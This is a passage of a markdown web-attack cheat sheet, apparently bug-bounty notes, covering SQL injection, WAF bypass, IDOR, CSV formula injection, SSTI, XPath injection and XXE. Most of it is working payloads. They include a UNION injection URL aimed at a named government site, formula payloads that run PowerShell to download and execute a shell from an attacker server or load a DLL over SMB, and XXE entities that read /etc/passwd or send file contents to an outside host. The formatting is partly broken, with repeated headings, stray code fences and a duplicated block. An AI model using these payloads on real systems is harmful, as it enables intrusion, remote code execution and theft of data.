page.asp?id=1 or 1=1 -- true
page.asp?id=1' or 1=1 -- true
page.asp?id=1" or 1=1 -- true
page.asp?id=1 and 1=2 -- false
```
#### WAF Bypass Techniques
```sh
?id=1%09and%091=1%09--
?id=1%0Dand%0D1=1%0D--
?id=1%0Cand%0C1=1%0C--
?id=1%A0and%A01=1%A0--
```
#### Alternative Operators
```sh
AND   -> &&
OR    -> ||
=     -> LIKE, REGEXP, BETWEEN
```

### Blind SQL Injection (Boolean-Based)
```sh
?id=1' and 1=1 --+  # True
?id=1' and 1=2 --+  # False
```
#### Extract Database Name
```sh
?id=1' and substring(database(),1,1)="a" --+
```
### Time-Based SQL Injection
```sh
?id=1' and sleep(10) --+
```
### SQLMap Usage
```sh
sqlmap -u "http://target.com/?id=1" --dbs
sqlmap -u "http://target.com/?id=1" -D target_db --tables
```
---

## Tools for Exploitation
- [Hackbar](https://code.google.com/archive/p/hackbar/downloads)
- [SQLMap](https://github.com/sqlmapproject/sqlmap)
- [JWT Tool](https://github.com/ticarpi/jwt_tool)

Reference Video: [SQL Injection Exploitation](https://www.youtube.com/watch?v=vWoZK8UM6js)

---
# WAF Bypass Techniques

## SQL Injection WAF Bypass

In error-based SQL injection, we might be unable to fetch data from the database using the `UNION` function. For example:

```sql
' UNION ALL SELECT 1,2,3,4,5,6,7 --+
```

If we get a "Not Acceptable" error, it may be due to certain keywords (`UNION`, `ALL`, `SELECT`) being blocked by the WAF. We can bypass this restriction using comments:

```sql
' /*!12345UNION*/ ALL SELECT 1,2,3,4,5,6,7-- +
```

Example:

```sql
http://multan.gov.pk/page.php?data=-2' /*!12345union*/ all select 1,2,database(),4,5,6,7 --+
' /*!12345union*/ all select 1,2,(SELECT+/*!12345GROUP_CONCAT*/(schema_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.SCHEMATA),4,5,6,7 --+
```

### Using HackBar
Using keywords such as `/*!12345UNION*/` converts the query into filtered keywords, allowing easy bypass of WAF restrictions.

---

## SQL Injection Authentication Bypass

### Example Query
Assume the login query:

```sql
SELECT username ='value1' AND password='value2' WHERE some_other_condition
```

Bypassing authentication:

```sql
value1 = ' OR 1=1 --
value1 = '1 OR '1'='1 --
```

```sql
SELECT username ='' OR 1=1 -- '  --fix
SELECT username ='1 OR '1'='1 --'  --fix
```

**Reference:** [PentestLab Authentication Bypass Cheat Sheet](https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/)

### Identifying Vulnerable Fields
1. Try symbols like `\,',",~, etc.` to generate errors and identify query structure.
2. Test both username and password fields.
3. View source code to identify quote symbols.
4. Use brute-force attacks with default credentials.
5. If registration is open, create an account and escalate privileges.

---

## Improper Authorization

Exploiting improper access control by manipulating parameters such as `user_id`.

Example:
- Update profile information after logging out and send the same request again.
- If the information updates, it indicates a vulnerability.

---

## No Rate Limiting

**Example:** Forgot password functionality without rate limiting:

1. Capture request in Burp Suite.
2. Send it to Intruder/Sequencer.
3. Send 10,000 requests.
4. If 10,000 OTPs/SMS are received, the application is vulnerable.

---

## Password Reset Poisoning

Example:
1. Request a password reset link.
2. Change the password manually after login.
3. Check if the previous reset link still works.

If the reset link remains valid, the system is vulnerable.

---

## HSTS Vulnerability
Check using:
- [SSL Labs](https://www.ssllabs.com)
- Burp Suite response analysis

---

## Account Lockout Issues
- No account lockout policy allows brute-force attacks.

## Long Password DoS
Check if the system allows excessively long passwords (>500 characters).

Test with:
- [Password DoS](https://password-dos.herokuapp.com/)

---

## IDOR (Insecure Direct Object Reference)

### Examples:
1. **Forgot Password Flow:**
   - Intercept request containing `email` and `user_id`.
   - Modify parameters and check for unauthorized access.

2. **Facebook Page Deletion Attack:**
   - If a page delete request contains `page_id`, replace it with another user's ID to delete their page.

3. **Comment Modification:**
   - Modify `uid` in request to change another user's comment.

4. **Account Takeover:**
   - Modify `profile_id` in a profile update request to edit another user's account.

**References:**
- [HackerOne Report 227522](https://hackerone.com/reports/227522)
- [HackerOne Report 322661](https://hackerone.com/reports/322661)

---

## Parameter Tampering in Payment Gateways

### Example: PayPal

Encoded payment parameters:
```
&option_amount1=10.00&option_amount_selection1=pay10&
```

**Steps to Exploit:**
1. Decode base64 values.
2. Modify values (e.g., `10.00` → `1.00`).
3. Re-encode and send the request.
4. If payment is processed at the modified amount, the system is vulnerable.

---

## Privilege Escalation

### Example: Reusing Invitation Links
- If an invitation link does not expire, anyone can use it to join a group.

### Accessing Admin Resources
- Normal users accessing admin panels by modifying request parameters.
- Example: `admin/trustcer`, `admin/reports`, `admin/dashboard`.

---

## XML Exploitation

Extensible Markup Language (XML) files may contain sensitive data such as usernames and passwords.

Example:
```xml
http://10.10.10.10/cat/accountsid=1
```

1. Try SQL injection.
2. Use blind SQL techniques.
3. Break query execution.

**Tools:**
- [Xpath Injection Toolkit](https://github.com/r0oth3x49/Xpath)
- [xcat - XML Injection Tool](https://github.com/orf/xcat) *(Requires Python 3.7)*

---

### Missing Videos
- Authentication and Authorization Attacks
- Session Management Issues
- Data Deserialization Vulnerabilities

---

## Iframe Injection Example
```html
<iframe src="http://bing.com" height="100%" width="100%"></iframe>
```

---

# CSV Injection (Formula Injection)

## Overview
CSV Injection, also known as Formula Injection, occurs when an application allows users to export data into an Excel file (CSV format) that contains malicious formulas. When the exported file is opened in spreadsheet software, the formulas can execute arbitrary commands on the system.

## Steps to Test for CSV Injection
1. Select any parameter that is part of the Excel sheet to be downloaded.
2. Modify values in these fields to insert malicious formulas (e.g., First Name, Last Name, Amount, Title, Status, etc.).
3. Download the Excel file and open it.
4. If the injected formula executes (e.g., launches the calculator), the application is vulnerable.

> **Mistake:** Do not upload the Excel file back into the application for verification. This results in a false negative.
```
=
+
–
@
```

## Example Payloads
### Pop Calculator
```csv
DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+1)*cmd|' /C calc'!A0
=2+5+cmd|' /C calc'!A0
```

### Pop Notepad
```csv
=cmd|' /C notepad'!'A1'
```

### PowerShell Download and Execute
```csv
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
```

### Metasploit SMB Delivery with rundll32
```csv
=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
```

## Technical Details
- `cmd` is the command-line interpreter that the formula can invoke.
- `/C calc` specifies the command to execute (`calc.exe` in this case).
- `!A0` or similar references indicate where the formula should be placed in the spreadsheet.

### Google Sheets

Google Sheets allows some additionnal formulas that are able to fetch remote URLs:

* [IMPORTXML](https://support.google.com/docs/answer/3093342?hl=en)(url, xpath_query, locale)
* [IMPORTRANGE](https://support.google.com/docs/answer/3093340)(spreadsheet_url, range_string)
* [IMPORTHTML](https://support.google.com/docs/answer/3093339)(url, query, index)
* [IMPORTFEED](https://support.google.com/docs/answer/3093337)(url, [query], [headers], [num_items])
* [IMPORTDATA](https://support.google.com/docs/answer/3093335)(url)

So one can test blind formula injection or a potential for data exfiltration with:

```c
=IMPORTXML("http://burp.collaborator.net/csv", "//a/@href")
```

## Mitigation
To prevent CSV injection:
- Prefix user input with a single quote (`'`) to treat it as text.
- Validate and sanitize user input before exporting.
- Restrict export functionality if formula execution poses a security risk.

---
# Server-Side Template Injection (SSTI)

Server-Side Template Injection (SSTI) can occur when an application allows users to modify templates, such as:

- **Email Templates**
- **Suspension Notices**
- **Invoices**

If the application processes user input as part of a template rendering engine, SSTI might be possible.

## Steps to Identify SSTI

1. **Edit a Template**  
   - Locate a feature where templates are editable (e.g., email body, invoice format).

2. **Identify Vulnerable Parameters**  
   - Check for fields where user input is dynamically processed (e.g., columns, placeholders).

3. **Insert Malicious Payload**  
   - Test with payloads like:
     ```jinja
     {{ 7*7 }}  <!-- Checks for Jinja2 -->
     ${7*7}     <!-- Checks for JSP/Thymeleaf -->
     <% 7*7 %>  <!-- Checks for PHP/Velocity -->
     ```
   - For critical exploitation, try:
     ```jinja
     {% extends "/etc/passwd" %}
     ```

4. **Save, Preview, or Download the Output**  
   - If the server executes the injected template and returns system information, it's vulnerable.

## Mitigation Strategies

- **Use Safe Template Engines**  
  - Avoid using engines that allow direct execution of user input.
  
- **Implement Input Validation & Escaping**  
  - Ensure user input is sanitized before rendering.

- **Disable Dangerous Functions**  
  - Restrict access to filesystem and system functions in template rendering.

---
# XPath Injection

XPath Injection is an attack technique used to exploit applications that construct XPath (XML Path Language) queries from user-supplied input to query or navigate XML documents. Similar to SQL Injection, this attack can manipulate XPath queries to gain unauthorized access to data.

## Common Payloads
```xpath
' or '1'='1
' or ''=''
x' or 1=1 or 'x'='y
/
//
//*
*/*
@*
count(/child::node())
x' or name()='username' or 'x'='y
' and count(/*)=1 and '1'='1
' and count(/@*)=1 and '1'='1
' and count(/comment())=1 and '1'='1
search=')] | //user/*[contains(*,'
search=Har') and contains(../password,'c
search=Har') and starts-with(../password,'c
```

## Tools
- **xcat** - Automate XPath injection attacks to retrieve documents
- **xxxpwn** - Advanced XPath Injection Tool
- **xxxpwn_smart** - A fork of xxxpwn using predictive text
- **xpath-blind-explorer**
- **XmlChor** - XPath injection exploitation tool

### Related Resources
[PayloadsAllTheThings - XPath Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XPATH%20Injection)

---

## Bug Bounty Videos
1. **Extracting Password from Browser Memory Dump** using Task Manager and WinHex
2. **Cookie Poisoning Demonstration**
3. **XSS with HTTP Response Splitting**
4. **JSON Attack - How to Find and Exploit JSON Vulnerabilities**

# XML External Entity (XXE) Attack

An **XML External Entity (XXE) attack** is a type of attack against an application that parses XML input and allows XML entities. XML entities can be used to tell the XML parser to fetch specific content on the server.

## Types of Entities

### Internal Entity  
If an entity is declared within a DTD, it is called an **internal entity**.  
**Syntax:**  
```xml
<!ENTITY entity_name "entity_value">
```

### External Entity  
If an entity is declared outside a DTD, it is called an **external entity** and is identified by `SYSTEM`.  
**Syntax:**  
```xml
<!ENTITY entity_name SYSTEM "entity_value">
```

## Exploiting XXE

Setting the `Content-Type: application/xml` in the request when sending an XML payload to the server can be helpful in exploitation.

### Example: Reading `/etc/passwd`
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY test SYSTEM 'file:///etc/passwd'>
]>
<root>&test;</root>
```

Another example:
```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ELEMENT data (#ANY)>
  <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```
## Vulnerabilities

XXE vulnerabilities often exist in **XML-RPC implementations** and other XML-based data processing systems.

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
```

```xml
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
```
### XXE OOB Attack (Yunusov, 2013).
### XXE OOB Attack (Yunusov, 2013)
```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "http://publicServer.com/parameterEntity_oob.dtd">
<data>&send;</data>
```
### File stored on http://publicServer.com/parameterEntity_oob.dtd
```
<!ENTITY % file SYSTEM "file:///sys/power/image_size">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://publicServer.com/?%file;'>">
%all;
```
### XXE PHP Wrapper
```
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<contacts>
  <contact>
    <name>Jean &xxe; Dupont</name>
    <phone>00 11 22 33 44</phone>
    <adress>42 rue du CTF</adress>
    <zipcode>75000</zipcode>
    <city>Paris</city>
  </contact>
</contacts>
```
🔹 **Tools for Testing**: 
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection
```
🔹 **Mitigation**: Disable external entity processing in XML parsers or use libraries with built-in protection against XXE.  
🔹 **Tools for Testing**: Burp Suite, OWASP ZAP, and `xxe.py` can help in identifying XXE vulnerabilities.

### Classic XXE B64 Encoded
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>

```
Classic XXE - etc passwd
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```

### Classic XXE
